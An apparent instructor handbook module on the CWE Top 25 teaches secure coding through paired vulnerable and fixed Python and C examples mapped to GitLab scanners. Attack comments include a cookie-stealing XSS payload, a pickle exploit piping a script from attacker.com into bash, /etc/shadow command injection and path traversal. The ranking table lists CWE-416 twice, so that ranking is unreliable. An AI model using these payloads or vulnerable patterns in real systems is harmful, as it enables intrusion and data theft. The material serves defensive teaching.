# INSTRUCTOR HANDBOOK — MODULE 9
## SANS/CWE Top 25 Most Dangerous Software Weaknesses

---

### Module Metadata

| Field          | Value                                            |
|----------------|--------------------------------------------------|
| Module Number  | 9 of 16                                          |
| Day            | Day 2                                            |
| Duration       | 75 minutes (55 min content + 20 min code lab)   |
| Difficulty     | Intermediate–Advanced — code-level weakness analysis |
| Prerequisites  | Module 8 (OWASP Top 10) complete                |
| Key Deliverable | CWE Top 25 → GitLab mapping table + vulnerable code examples |

---

## Instructor Preparation Notes

### The Distinction from OWASP Top 10
OWASP Top 10 categorises *vulnerability classes* at an application level. CWE Top 25 identifies *root cause weaknesses* at the code level. The distinction matters:

> "OWASP A03 (Injection) is a category. CWE-89 (SQL Injection) and CWE-78 (Command Injection) are specific weaknesses within that category. CWE is the vocabulary that SAST rules are written in. When a SAST tool reports 'CWE-89', it is telling you the specific weakness type, which maps to a specific code pattern, which has a specific fix."

This module gives participants the code-level fluency to understand SAST findings. A developer who sees "CWE-89" and understands it immediately is a developer who fixes the finding in 5 minutes.

### CWE Top 25 Reference
MITRE CWE Top 25: https://cwe.mitre.org/top25/
Updated annually. Current list from CWE website is the authoritative source.

### Teaching Approach
For each weakness:
1. **Root cause** — what programming mistake enables this weakness
2. **Vulnerable code** (Python, minimal, clear) — what the mistake looks like
3. **Secure alternative** — the correct pattern
4. **Detection** — what the SAST rule pattern-matches on
5. **GitLab capability** — which scanner handles it

---

## Learning Objectives

1. Define the top CWE weaknesses with code-level root cause analysis.
2. Identify vulnerable and secure code patterns for each weakness category.
3. Explain what a SAST rule detects and why it generates the finding.
4. Map CWE IDs to GitLab scanner capabilities.
5. Prioritise which weaknesses to address first based on severity and prevalence.

---

## Module Content

---

### CWE-89: SQL Injection

**Root Cause:** String concatenation used to build SQL queries. User input treated as SQL syntax.

```python
# ❌ VULNERABLE
def get_user(user_id):
    query = "SELECT * FROM users WHERE id = " + user_id
    return db.execute(query).fetchone()

# ✅ SECURE — Parameterised query
def get_user(user_id):
    return db.execute("SELECT * FROM users WHERE id = ?", (user_id,)).fetchone()

# ✅ SECURE — ORM
def get_user(user_id):
    return User.query.filter_by(id=user_id).first()
```

**What SAST Detects:** String concatenation patterns in `execute()`, `query()`, `cursor()` calls; format strings used in SQL context.

**GitLab Scanner:** SAST (Semgrep — `python.lang.security.audit.formatted-sql-query`)

---

### CWE-79: Cross-Site Scripting (XSS)

**Root Cause:** User-supplied data rendered in HTML output without encoding. Browser executes attacker-controlled JavaScript.

```python
# ❌ VULNERABLE — renders raw user input
@app.route('/greet')
def greet():
    name = request.args.get('name')
    return f"<h1>Hello {name}!</h1>"
    # Attack: name = "<script>document.location='http://attacker.com/?c='+document.cookie</script>"

# ✅ SECURE — use template engine with auto-escaping
from flask import render_template_string
@app.route('/greet')
def greet():
    name = request.args.get('name')
    # Jinja2 auto-escapes HTML by default in render_template
    return render_template_string("<h1>Hello {{ name }}!</h1>", name=name)
    # {{ name }} is HTML-escaped: <script> becomes &lt;script&gt;
```

**For Robotics/IoT:** XSS in embedded web interfaces (common in router firmware, device management dashboards) can lead to session hijacking and full device takeover.

**GitLab Scanner:** SAST (Semgrep, ESLint security plugin for JavaScript)

---

### CWE-78: OS Command Injection

**Root Cause:** User input passed to a shell command without sanitisation. Most critical injection type — leads directly to remote code execution.

```python
# ❌ VULNERABLE
import subprocess
def run_diagnostic(host):
    output = subprocess.run(f"ping -c 3 {host}", shell=True, capture_output=True)
    return output.stdout
    # Attack: host = "8.8.8.8; cat /etc/shadow"

# ✅ SECURE — list arguments, no shell
def run_diagnostic(host):
    # Validate input first
    import re
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError("Invalid hostname")
    output = subprocess.run(
        ["ping", "-c", "3", host],  # List — no shell interpretation
        shell=False,                 # Explicit
        capture_output=True,
        timeout=10
    )
    return output.stdout
```

**For Embedded/IoT:** ROS node message handlers, diagnostic utilities, network management scripts in embedded Linux are frequent vectors. Any string from a network interface that reaches a `system()` or `popen()` call is vulnerable.

**What SAST Detects:** `shell=True` with non-literal arguments; `os.system()`, `os.popen()`, `subprocess.call()` with user-derived strings.

**GitLab Scanner:** SAST (Semgrep — `python.lang.security.audit.subprocess-shell-true`)

---

### CWE-22: Path Traversal

**Root Cause:** User-supplied file path not validated, allowing access to files outside the intended directory.

```python
# ❌ VULNERABLE
import os
@app.route('/files/<filename>')
def serve_file(filename):
    filepath = os.path.join('/var/app/data', filename)
    with open(filepath, 'r') as f:
        return f.read()
    # Attack: filename = "../../etc/passwd"
    # Path resolves to: /var/app/data/../../etc/passwd → /etc/passwd

# ✅ SECURE — resolve and validate path is within intended directory
import os
BASE_DIR = '/var/app/data'

@app.route('/files/<filename>')
def serve_file(filename):
    # Resolve the absolute path
    filepath = os.path.realpath(os.path.join(BASE_DIR, filename))
    
    # Verify it stays within BASE_DIR
    if not filepath.startswith(BASE_DIR + os.sep):
        return "Access denied", 403
    
    if not os.path.isfile(filepath):
        return "Not found", 404
    
    with open(filepath, 'r') as f:
        return f.read()
```

**GitLab Scanner:** SAST (Semgrep — `python.lang.security.audit.path-traversal`)

---

### CWE-798: Use of Hard-Coded Credentials

**Root Cause:** Passwords, API keys, tokens embedded directly in source code. Exposed to anyone with repository access; persists in git history even after removal.

```python
# ❌ VULNERABLE — hardcoded in every way possible
API_KEY = "sk-prod-abc123xyz789"
DB_PASSWORD = "MyPassword123!"
AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# ❌ ALSO VULNERABLE — in config files committed to repo
# config.yml:
#   database:
#     password: "MyPassword123!"

# ✅ SECURE — environment variables
import os
API_KEY = os.environ['API_KEY']         # Set in GitLab CI/CD Variables (masked)
DB_PASSWORD = os.environ['DB_PASSWORD']  # Set in GitLab CI/CD Variables (masked + protected)

# ✅ ALSO SECURE — secrets manager
import boto3
def get_secret(secret_name):
    client = boto3.client('secretsmanager')
    return client.get_secret_value(SecretId=secret_name)['SecretString']
```

**What Secret Detection Finds:**
Gitleaks uses regex patterns for known secret formats:
- AWS: `AKIA[0-9A-Z]{16}`
- GitHub tokens: `ghp_[a-zA-Z0-9]{36}`
- Private keys: `-----BEGIN RSA PRIVATE KEY-----`
- Generic high-entropy strings

**Critical Point:**
> "Removing a hardcoded secret from source code does NOT remove it from git history. `git log -p` will still show it. The correct remediation is: remove the file, clean git history with `git filter-repo` or `BFG Repo-Cleaner`, AND rotate/revoke the credential immediately — assume it is compromised."

**GitLab Scanner:** Secret Detection (Gitleaks) — `Jobs/Secret-Detection.gitlab-ci.yml`  
Source: https://docs.gitlab.com/ee/user/application_security/secret_detection/

---

### CWE-502: Deserialization of Untrusted Data

**Root Cause:** Deserialising data from an untrusted source using a format that allows code execution (Python pickle, Java serialization).

```python
# ❌ CRITICAL — arbitrary code execution via pickle
import pickle
import base64
from flask import request

@app.route('/api/session/restore', methods=['POST'])
def restore_session():
    data = base64.b64decode(request.json['session_data'])
    session = pickle.loads(data)  # ← CRITICAL: attacker controls __reduce__
    return jsonify({'status': 'ok'})

# Attacker's payload:
# class Exploit:
#     def __reduce__(self):
#         return (os.system, ('curl http://attacker.com/shell.sh | bash',))
# payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# ✅ SECURE — use JSON for data interchange with untrusted sources
import json
@app.route('/api/session/restore', methods=['POST'])
def restore_session():
    data = request.get_json()  # JSON cannot execute code
    # Validate schema explicitly
    required = {'user_id', 'expires_at', 'permissions'}
    if not required.issubset(data.keys()):
        return jsonify({'error': 'Invalid session data'}), 400
    session['user_id'] = int(data['user_id'])  # Type coercion validates
    return jsonify({'status': 'ok'})
```

**GitLab Scanner:** SAST (Semgrep — `python.lang.security.audit.insecure-pickle-use`)

---

### CWE-287: Improper Authentication

**Root Cause:** Authentication checks missing, bypassable, or incomplete.

```python
# ❌ VULNERABLE — authentication check after using the data
@app.route('/api/admin/users')
def list_users():
    users = User.query.all()      # Data fetched BEFORE auth check
    if not current_user.is_admin:
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify([u.to_dict() for u in users])

# ❌ ALSO VULNERABLE — auth can be bypassed with null/None
def check_token(token):
    if token == ADMIN_TOKEN:      # If ADMIN_TOKEN is None/empty,
        return True               # any None token bypasses auth
    return False

# ✅ SECURE — decorator-based, fail-closed
from functools import wraps

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization', '').replace('Bearer ', '')
        if not token or not is_valid_token(token):
            return jsonify({'error': 'Unauthorised'}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/api/admin/users')
@require_auth
@require_admin
def list_users():
    return jsonify([u.to_dict() for u in User.query.all()])
```

**GitLab Scanner:** SAST, DAST

---

### CWE-476: NULL Pointer Dereference (Memory Safety — C/C++/Embedded)

**Root Cause:** Pointer used without checking if it is NULL. Critical for embedded/robotics/IoT C code.

```c
// ❌ VULNERABLE
void process_command(robot_command_t *cmd) {
    // cmd could be NULL if allocation failed or caller error
    printf("Executing command: %d\n", cmd->type);  // Crash if cmd is NULL
    execute(cmd->payload, cmd->length);
}

// ✅ SECURE — always validate pointer before use
void process_command(robot_command_t *cmd) {
    if (cmd == NULL) {
        log_error("Received NULL command pointer");
        return;
    }
    if (cmd->length == 0 || cmd->length > MAX_COMMAND_LENGTH) {
        log_error("Invalid command length: %zu", cmd->length);
        return;
    }
    printf("Executing command: %d\n", cmd->type);
    execute(cmd->payload, cmd->length);
}
```

**GitLab Scanner:** SAST (language-specific C/C++ analyzers — Semgrep, Flawfinder)

---

### CWE-125/787: Out-of-Bounds Read/Write (Memory Safety — C/C++)

**Root Cause:** Buffer accessed beyond its allocated size. Most critical in embedded firmware — can cause crashes, data corruption, or remote code execution.

```c
// ❌ VULNERABLE — buffer overflow
void copy_firmware_header(const uint8_t *src, size_t src_len) {
    uint8_t header[256];
    memcpy(header, src, src_len);  // src_len could be > 256!
    // Buffer overflow: writes beyond header[], corrupts stack
}

// ✅ SECURE — always bounds-check
void copy_firmware_header(const uint8_t *src, size_t src_len) {
    uint8_t header[256];
    size_t copy_len = (src_len < sizeof(header)) ? src_len : sizeof(header);
    memcpy(header, src, copy_len);
}

// ✅ ALSO SECURE — use safer functions
void copy_firmware_header(const uint8_t *src, size_t src_len) {
    uint8_t header[256];
    memcpy_s(header, sizeof(header), src, src_len);  // Bounds-checked
}
```

**For Embedded Teams:**
> Buffer overflows in firmware processing untrusted network data (MQTT payloads, OTA update headers, BLE command packets) can lead to full device compromise. A single overflow in the OTA update parser can be used to push malicious code to every device in the fleet.

**GitLab Scanner:** SAST (Semgrep, Flawfinder for C/C++ — flagging `memcpy`, `strcpy`, `sprintf` without bounds checks)

---

### CWE-306: Missing Authentication for Critical Function

**Root Cause:** A critical function (admin action, destructive operation, sensitive data access) is accessible without authentication.

```python
# ❌ VULNERABLE — debug/admin endpoint with no auth
@app.route('/debug/reset-database', methods=['POST'])
def reset_database():
    db.drop_all()
    db.create_all()
    return jsonify({'status': 'database reset'})

# ❌ FOR IOT: OTA update endpoint without authentication
@app.route('/ota/update', methods=['POST'])
def update_firmware():
    firmware = request.get_data()
    flash_firmware(firmware)  # Anyone can push firmware!

# ✅ SECURE
@app.route('/ota/update', methods=['POST'])
@require_device_certificate  # Mutual TLS / device cert auth
@require_valid_signature      # Firmware signature verification
def update_firmware():
    firmware = request.get_data()
    if not verify_firmware_signature(firmware, TRUSTED_SIGNING_KEY):
        return jsonify({'error': 'Invalid firmware signature'}), 403
    flash_firmware(firmware)
```

**GitLab Scanner:** SAST, DAST (ZAP discovers unauthenticated admin endpoints)

---

### CWE-434: Unrestricted File Upload

**Root Cause:** Application accepts file uploads without validating type, content, or destination.

```python
# ❌ VULNERABLE
@app.route('/upload', methods=['POST'])
def upload_file():
    file = request.files['file']
    file.save(f'/var/www/uploads/{file.filename}')
    # Attack: upload shell.php → execute via /uploads/shell.php
    # Attack: upload ../../app/config.py → overwrite app config

# ✅ SECURE
import os, uuid
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'jpg', 'png', 'pdf', 'csv'}
UPLOAD_DIR = '/var/app/uploads'  # Outside web root

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    file = request.files['file']
    
    # Validate extension (allowlist only)
    ext = file.filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return jsonify({'error': 'File type not permitted'}), 400
    
    # Generate safe filename — never use user-supplied filename
    safe_name = f"{uuid.uuid4()}.{ext}"
    filepath = os.path.join(UPLOAD_DIR, safe_name)
    file.save(filepath)
    return jsonify({'file_id': safe_name})
```

**GitLab Scanner:** SAST, DAST

---

## CWE Top 25 Summary — GitLab Detection Coverage

| Rank | CWE ID | Name | GitLab Scanner | Template |
|---|---|---|---|---|
| 1 | CWE-787 | Out-of-Bounds Write | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 2 | CWE-79 | XSS | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 3 | CWE-125 | Out-of-Bounds Read | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 4 | CWE-416 | Use After Free | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 5 | CWE-78 | Command Injection | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 6 | CWE-20 | Improper Input Validation | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 7 | CWE-89 | SQL Injection | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 8 | CWE-416 | Use After Free | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 9 | CWE-22 | Path Traversal | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 10 | CWE-352 | CSRF | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 11 | CWE-434 | Unrestricted Upload | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 12 | CWE-502 | Unsafe Deserialization | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 13 | CWE-287 | Improper Authentication | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 14 | CWE-476 | NULL Pointer Dereference | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 15 | CWE-798 | Hardcoded Credentials | Secret Detection | `Jobs/Secret-Detection.gitlab-ci.yml` |
| 16 | CWE-306 | Missing Auth Critical Func | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 17 | CWE-862 | Missing Authorisation | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 18 | CWE-269 | Improper Privilege Management | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 19 | CWE-94 | Code Injection | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 20 | CWE-863 | Incorrect Authorisation | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 21 | CWE-276 | Incorrect Default Permissions | IaC Scanning | `Jobs/IaC-Scanning.gitlab-ci.yml` |
| 22 | CWE-190 | Integer Overflow | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 23 | CWE-119 | Buffer Overflow (generic) | SAST | `Jobs/SAST.gitlab-ci.yml` |
| 24 | CWE-918 | SSRF | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |
| 25 | CWE-77 | Command Injection (generic) | SAST, DAST | `Jobs/SAST.gitlab-ci.yml` |

Source: https://cwe.mitre.org/top25/

---

## Code Exercise (20 minutes)

### Exercise: Spot and Fix the Weakness

Participants receive the vulnerable sample (from `07_Vulnerable_Apps/`) and must:
1. Identify which CWE each vulnerability represents
2. Explain what the SAST rule is looking for
3. Write the secure alternative

The vulnerable application is in: `07_Vulnerable_Apps/M09_vulnerable_examples.py`

---

## References

1. **CWE Top 25 (2023)** — https://cwe.mitre.org/top25/
2. **GitLab SAST Analyzers** — https://docs.gitlab.com/ee/user/application_security/sast/analyzers.html
3. **Semgrep Rules** — https://semgrep.dev/explore
4. **Flawfinder** — https://dwheeler.com/flawfinder/
5. **GitLab Secret Detection** — https://docs.gitlab.com/ee/user/application_security/secret_detection/
